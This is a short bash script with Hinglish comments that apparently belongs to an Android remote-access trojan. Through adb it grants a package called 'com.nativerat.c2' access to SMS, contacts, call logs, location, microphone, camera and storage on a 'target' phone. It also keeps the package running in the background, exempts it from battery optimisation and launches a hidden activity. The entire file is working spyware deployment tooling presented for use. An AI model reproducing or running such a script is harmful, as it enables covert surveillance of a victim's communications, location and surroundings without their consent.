#!/bin/bash
# Usage: ./grant.sh   (target par adb connected hona chahiye)
PKG="com.nativerat.c2"

if ! command -v adb &>/dev/null; then
  echo "[!] adb nahi mila. Termux:  pkg install termux-adb"
  exit 1
fi

PERMS=(READ_SMS RECEIVE_SMS SEND_SMS READ_CONTACTS READ_CALL_LOG
       ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO CAMERA
       READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE READ_PHONE_STATE
       CALL_PHONE POST_NOTIFICATIONS)

for p in "${PERMS[@]}"; do
  adb shell pm grant "$PKG" "android.permission.$p" 2>/dev/null && echo "[+] granted $p"
done

# special permissions
adb shell appops set "$PKG" SYSTEM_ALERT_WINDOW allow
adb shell appops set "$PKG" RUN_IN_BACKGROUND allow
adb shell appops set "$PKG" START_FOREGROUND allow
adb shell dumpsys deviceidle whitelist +"$PKG"

echo "[*] done. Manual trigger:"
echo "    adb shell am start -n $PKG/.HiddenActivity"